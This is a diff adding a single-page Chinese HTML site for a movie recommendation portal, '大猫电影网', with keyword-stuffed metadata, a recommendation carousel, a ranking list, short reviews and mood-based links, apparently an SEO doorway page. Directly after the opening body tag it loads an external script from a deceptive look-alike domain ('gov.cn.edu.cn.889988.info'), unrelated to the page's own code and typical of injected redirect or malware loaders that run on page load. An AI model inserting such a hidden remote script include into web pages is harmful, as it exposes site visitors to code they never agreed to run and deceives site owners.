@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>大猫电影网 - 好看好懂的高清电影推荐</title>
+<meta name="description" content="大猫电影网(damaodianyingwang-top)提供高清电影推荐、热播榜、影评与找片入口，网址 https://damaodianyingwang-top，轻松发现值得看的好电影。">
+<meta name="keywords" content="大猫电影网, damaodianyingwang-top, 高清电影, 电影推荐, 热播电影, 电影影评">
+<meta name="author" content="大猫电影网">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow">
+<style>
+:root{
+  --bg:#fff7ed;
+  --card:#ffffff;
+  --ink:#27272a;
+  --muted:#71717a;
+  --brand:#f97316;
+  --brand-dark:#ea580c;
+  --line:#ffe4c7;
+  --radius:22px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);
+  color:var(--ink);
+  line-height:1.75;
+}
+a{color:var(--brand-dark);text-decoration:none}
+a:hover{color:var(--brand)}
+.container{width:92%;max-width:1180px;margin:0 auto}
+img{max-width:100%;display:block}
+
+/* 导航 */
+.nav{
+  position:sticky;top:0;z-index:50;
+  background:rgba(255,247,237,.92);
+  backdrop-filter:blur(8px);
+  border-bottom:1px solid var(--line);
+}
+.nav-in{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 0;
+}
+.brand{
+  font-size:22px;font-weight:800;color:var(--brand-dark);
+}
+.brand b{color:var(--ink)}
+.menu{display:flex;gap:18px;flex-wrap:wrap}
+.menu a{
+  color:var(--ink);font-weight:600;font-size:15px;
+  padding:6px 10px;border-radius:999px;
+}
+.menu a:hover{background:#ffedd5}
+.hamburger{
+  display:none;background:#ffedd5;border:1px solid var(--line);
+  color:var(--brand-dark);font-size:22px;border-radius:12px;padding:4px 12px;cursor:pointer;
+}
+
+/* 首屏 */
+.hero{
+  padding:64px 0 40px;
+  background:radial-gradient(120% 120% at 0% 0%, #ffe4c7 0%, #fff7ed 55%);
+}
+.hero h1{font-size:42px;line-height:1.2;margin-bottom:14px}
+.hero h1 span{color:var(--brand-dark)}
+.hero p{color:var(--muted);font-size:17px;max-width:640px;margin-bottom:22px}
+.url-pill{
+  display:inline-block;background:#fff;border:1px dashed var(--brand);
+  color:var(--brand-dark);font-weight:700;padding:8px 16px;border-radius:999px;margin-bottom:22px;
+}
+.btn{
+  display:inline-block;background:var(--brand);color:#fff;font-weight:700;
+  padding:12px 26px;border-radius:999px;box-shadow:0 10px 24px rgba(249,115,22,.35);
+}
+.btn:hover{background:var(--brand-dark);color:#fff;transform:translateY(-2px)}
+
+/* 栏目 */
+.section{padding:56px 0}
+.section h2{font-size:28px;margin-bottom:6px}
+.section .sub{color:var(--muted);margin-bottom:26px}
+
+/* 横向卡片 */
+.h-scroll{
+  display:flex;gap:18px;overflow-x:auto;padding-bottom:10px;
+  scroll-snap-type:x mandatory;
+}
+.movie{
+  scroll-snap-align:start;flex:0 0 260px;background:var(--card);
+  border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;
+}
+.movie img{height:340px;object-fit:cover}
+.movie .body{padding:14px 16px}
+.movie h3{font-size:17px;margin-bottom:4px}
+.movie p{color:var(--muted);font-size:14px}
+.tag{
+  display:inline-block;background:#fff7ed;border:1px solid var(--line);
+  color:var(--brand-dark);font-size:12px;padding:2px 10px;border-radius:999px;margin-top:8px;
+}
+
+/* 榜单 */
+.rank{
+  max-width:760px;margin:0 auto;background:var(--card);
+  border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;
+}
+.rank-row{
+  display:flex;align-items:center;gap:16px;padding:16px 20px;
+  border-bottom:1px solid var(--line);
+}
+.rank-row:last-child{border-bottom:0}
+.num{
+  width:38px;height:38px;flex:none;display:grid;place-items:center;
+  background:var(--brand);color:#fff;font-weight:800;border-radius:12px;
+}
+.rank-row h3{font-size:16px}
+.rank-row p{color:var(--muted);font-size:14px;margin:0}
+.score{margin-left:auto;font-weight:800;color:var(--brand-dark)}
+
+/* 标签页 */
+.tabs{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:20px}
+.tab{
+  cursor:pointer;padding:8px 18px;border-radius:999px;
+  background:#fff;border:1px solid var(--line);font-weight:700;color:var(--muted);
+}
+.tab.active{background:var(--brand);color:#fff;border-color:var(--brand)}
+.panel{display:none}
+.panel.active{display:grid;gap:18px;grid-template-columns:repeat(auto-fill,minmax(280px,1fr))}
+.review{
+  background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:18px;
+}
+.review h4{margin-bottom:6px;color:var(--brand-dark)}
+.review p{color:#52525b;font-size:15px}
+
+/* 找片 */
+.find{
+  background:linear-gradient(120deg,#ffedd5,#fff7ed);
+  border:1px solid var(--line);border-radius:var(--radius);padding:28px;
+}
+.find h3{font-size:22px;margin-bottom:10px}
+.chips{display:flex;gap:10px;flex-wrap:wrap;margin-top:14px}
+.chip{
+  background:#fff;border:1px solid var(--line);border-radius:999px;
+  padding:8px 16px;color:var(--ink);font-weight:600;
+}
+
+/* 底部 */
+.footer{background:#27150a;color:#fde6cf;padding:40px 0 22px;margin-top:40px}
+.footer a{color:#ffb877}
+.footer .grid{display:grid;gap:24px;grid-template-columns:repeat(auto-fit,minmax(220px,1fr))}
+.footer h4{color:#ffd9b0;margin-bottom:12px}
+.footer p{color:#e7c6a4;font-size:14px}
+.copy{text-align:center;color:#caa987;font-size:13px;margin-top:26px}
+
+@media(max-width:768px){
+  .menu{display:none;position:absolute;top:62px;left:0;width:100%;
+    background:#fff7ed;flex-direction:column;padding:14px 4%;gap:8px;border-bottom:1px solid var(--line)}
+  .menu.open{display:flex}
+  .hamburger{display:block}
+  .hero h1{font-size:32px}
+  .section h2{font-size:24px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="nav">
+  <div class="container nav-in">
+    <div class="brand">大猫<b>电影网</b></div>
+    <nav class="menu" id="menu">
+      <a href="#home">首页</a>
+      <a href="#recommend">今日推荐</a>
+      <a href="#rank">热播榜</a>
+      <a href="#review">影评角</a>
+      <a href="#find">找片</a>
+    </nav>
+    <button class="hamburger" onclick="document.getElementById('menu').classList.toggle('open')">☰</button>
+  </div>
+</header>
+
+<section id="home" class="hero">
+  <div class="container">
+    <h1>大猫电影网：<span>好看好懂</span>的高清电影推荐站</h1>
+    <p>大猫电影网帮你告别片荒，每天精选高分片、热门片和冷门好片，适合手机、平板、电脑随时刷。</p>
+    <div class="url-pill">网址：https://damaodianyingwang-top</div>
+    <br>
+    <a href="#recommend" class="btn">开始看片</a>
+  </div>
+</section>
+
+<section id="recommend" class="section">
+  <div class="container">
+    <h2>今日推荐</h2>
+    <p class="sub">大猫电影网(damaodianyingwang-top)编辑部精选，横滑查看更多。</p>
+    <div class="h-scroll">
+      <article class="movie">
+        <img src="https://images.unsplash.com/photo-1489599849927-4ee5b7b0a0b1?w=500&q=70" alt="大猫电影网推荐：星际穿越">
+        <div class="body"><h3>星际穿越</h3><p>科幻 / 冒险 / 高分</p><span class="tag">9.4分</span></div>
+      </article>
+      <article class="movie">
+        <img src="https://images.unsplash.com/photo-1518676590629-3dcbd9c5a5c9?w=500&q=70" alt="大猫电影网推荐：盗梦空间">
+        <div class="body"><h3>盗梦空间</h3><p>悬疑 / 烧脑 / 爽片</p><span class="tag">9.3分</span></div>
+      </article>
+      <article class="movie">
+        <img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=500&q=70" alt="大猫电影网推荐：楚门的世界">
+        <div class="body"><h3>楚门的世界</h3><p>剧情 / 隐喻 / 经典</p><span class="tag">9.2分</span></div>
+      </article>
+      <article class="movie">
+        <img src="https://images.unsplash.com/photo-1542204165-65bf26472b9b?w=500&q=70" alt="大猫电影网推荐：海上钢琴师">
+        <div class="body"><h3>海上钢琴师</h3><p>音乐 / 文艺 / 治愈</p><span class="tag">9.1分</span></div>
+      </article>
+      <article class="movie">
+        <img src="https://images.unsplash.com/photo-1585951237318-9ea5e175b891?w=500&q=70" alt="大猫电影网推荐：泰坦尼克号">
+        <div class="body"><h3>泰坦尼克号</h3><p>爱情 / 灾难 / 不朽</p><span class="tag">9.0分</span></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<section id="rank" class="section" style="background:#fffdf8">
+  <div class="container">
+    <h2>大猫热播榜</h2>
+    <p class="sub">来自 damaodianyingwang-top 的本周用户播放偏好。</p>
+    <div class="rank">
+      <div class="rank-row"><div class="num">1</div><div><h3>肖申克的救赎</h3><p>剧情 · 希望与自由</p></div><div class="score">9.7</div></div>
+      <div class="rank-row"><div class="num">2</div><div><h3>阿甘正传</h3><p>剧情 · 人生奔跑</p></div><div class="score">9.5</div></div>
+      <div class="rank-row"><div class="num">3</div><div><h3>千与千寻</h3><p>动画 · 奇幻成长</p></div><div class="score">9.4</div></div>
+      <div class="rank-row"><div class="num">4</div><div><h3>蝙蝠侠：黑暗骑士</h3><p>动作 · 超级英雄</p></div><div class="score">9.3</div></div>
+      <div class="rank-row"><div class="num">5</div><div><h3>疯狂动物城</h3><p>动画 · 悬疑喜剧</p></div><div class="score">9.2</div></div>
+    </div>
+  </div>
+</section>
+
+<section id="review" class="section">
+  <div class="container">
+    <h2>影评角</h2>
+    <p class="sub">大猫电影网不只给分数，也给你人话影评。</p>
+    <div class="tabs">
+      <span class="tab active" onclick="switchTab('t1',this)">热门影评</span>
+      <span class="tab" onclick="switchTab('t2',this)">短评</span>
+      <span class="tab" onclick="switchTab('t3',this)">冷门好片</span>
+    </div>
+
+    <div id="t1" class="panel active">
+      <div class="review"><h4>@猫眼观众</h4><p>“大猫电影网推荐得挺准，星际穿越二刷还是起鸡皮疙瘩。”</p></div>
+      <div class="review"><h4>@周末刷片</h4><p>“楚门的世界放在现在看，反而更扎心，信息茧房写得很早。”</p></div>
+      <div class="review"><h4>@胶片控</h4><p>“海上钢琴师不是慢，是让你慢下来，大猫片单里有它就加分。”</p></div>
+    </div>
+
+    <div id="t2" class="panel">
+      <div class="review"><h4>@小赵</h4><p>“盗梦空间：看完脑子转三圈，值。”</p></div>
+      <div class="review"><h4>@阿橙</h4><p>“疯狂动物城：兔子追兔子，大人小孩都能看。”</p></div>
+      <div class="review"><h4>@夜场王</h4><p>“泰坦尼克号：老片但泪点不老。”</p></div>
+    </div>
+
+    <div id="t3" class="panel">
+      <div class="review"><h4>《心灵奇旅》</h4><p>“讲‘活着本身就有意义’，比很多励志片高级。”</p></div>
+      <div class="review"><h4>《海街日记》</h4><p>“没有大事件，但看完很安静、很舒服。”</p></div>
+      <div class="review"><h4>《看不见的客人》</h4><p>“反转密不透风，适合大猫电影网‘烧脑夜场’标签。”</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="find" class="section" style="background:#fffdf8">
+  <div class="container">
+    <h2>不想动脑？让大猫帮你找片</h2>
+    <p class="sub">大猫电影网(damaodianyingwang-top)按心情分类，点心情就能开片。</p>
+    <div class="find">
+      <h3>今天想看点什么？</h3>
+      <p>选一个心情，大猫给你递片子：不用纠结，打开就看。</p>
+      <div class="chips">
+        <a class="chip" href="#">睡前治愈</a>
+        <a class="chip" href="#">周末爽片</a>
+        <a class="chip" href="#">一个人看</a>
+        <a class="chip" href="#">和对象看</a>
+        <a class="chip" href="#">烧脑反转</a>
+        <a class="chip" href="#">哭一场</a>
+        <a class="chip" href="#">补经典</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="container grid">
+    <div>
+      <h4>大猫电影网</h4>
+      <p>网址：https://damaodianyingwang-top</p>
+      <p>关键词：大猫电影网 / damaodianyingwang-top</p>
+    </div>
+    <div>
+      <h4>栏目</h4>
+      <p><a href="#recommend">今日推荐</a></p>
+      <p><a href="#rank">热播榜</a></p>
+      <p><a href="#review">影评角</a></p>
+      <p><a href="#find">找片</a></p>
+    </div>
+    <div>
+      <h4>说明</h4>
+      <p>本页为单页演示站，内链使用 # 占位。</p>
+      <p>未生成 robots.txt 与 sitemap.xml。</p>
+    </div>
+  </div>
+  <div class="container copy">© 2026 大猫电影网 · damaodianyingwang-top · 示例展示页</div>
+</footer>
+
+<script>
+function switchTab(id,el){
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  el.classList.add('active');
+}
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',()=>document.getElementById('menu').classList.remove('open'));
+});
+</script>
+</body>
+</html>
